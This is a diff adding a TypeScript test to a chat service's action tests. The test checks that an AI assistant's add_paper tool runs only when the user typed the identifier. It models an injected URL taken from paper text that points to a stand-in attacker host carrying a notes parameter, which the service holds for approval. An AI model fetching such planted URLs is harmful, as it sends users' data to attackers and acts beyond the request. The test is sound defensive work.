@@ -165,6 +165,51 @@ describe('ChatService actions', () => {
     expect(thrown(() => chats.decide(id, pending.id, { approve: true }))).toMatchObject({ code: 'approval_gone' })
   })
 
+  it('adds a paper unasked only when the user typed its identifier; a URL taken from paper text, or a near miss, asks', async () => {
+    const { executor, ran } = fakeActions()
+    const outs: string[] = []
+    const add = (identifier: string): ToolCall => ({ name: 'add_paper', arguments: { identifier, request_quote: 'agrega el paper' } })
+    const { chats, updates } = await setupChats({
+      actions: executor,
+      responses: [
+        async (req) => {
+          outs.push(...(await callTools(actionsOf(req), [add('10.1109/icws.2017.13')])).map((o) => o.text))
+          return chatAnswer('ok')
+        },
+        async (req) => {
+          outs.push(...(await callTools(actionsOf(req), [add('https://attacker.example/?d=notes')])).map((o) => o.text))
+          return chatAnswer('ok')
+        },
+        async (req) => {
+          outs.push(...(await callTools(actionsOf(req), [add('10.1109/icws.2017.1')])).map((o) => o.text))
+          return chatAnswer('ok')
+        }
+      ]
+    })
+    const id = await chats.send({ ...ask('Por favor agrega el paper 10.1109/ICWS.2017.13'), actions: true })
+    await chats.idle()
+    expect(ran).toEqual(['add_paper'])
+    expect(outs[0]).toContain('"status":"done"')
+    expect((await chats.open(id)).messages[1]).toMatchObject({ role: 'action', tool: 'add_paper', state: 'executed', approval: 'request' })
+
+    await chats.send(ask('Por favor agrega el paper que cita Drain', id))
+    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
+    const [url] = (await chats.open(id)).approvals
+    expect(url).toMatchObject({ tool: 'add_paper', reason: 'not_requested', request: 'agrega el paper', args: { identifier: 'https://attacker.example/?d=notes' } })
+    chats.decide(id, url.id, { approve: false })
+    await chats.idle()
+    expect(ran).toEqual(['add_paper'])
+
+    const before = updates.filter((u) => u.kind === 'approvals').length
+    await chats.send(ask('Por favor agrega el paper 10.1109/ICWS.2017.13 otra vez', id))
+    await waitFor(() => updates.filter((u) => u.kind === 'approvals').length > before)
+    const [near] = (await chats.open(id)).approvals
+    expect(near).toMatchObject({ tool: 'add_paper', reason: 'not_requested', args: { identifier: '10.1109/icws.2017.1' } })
+    chats.decide(id, near.id, { approve: false })
+    await chats.idle()
+    expect(ran).toEqual(['add_paper'])
+  })
+
   it('always asks before what removes, even when asked for; a denial is recorded and told to Claude', async () => {
     const { executor, ran } = fakeActions()
     let told = ''
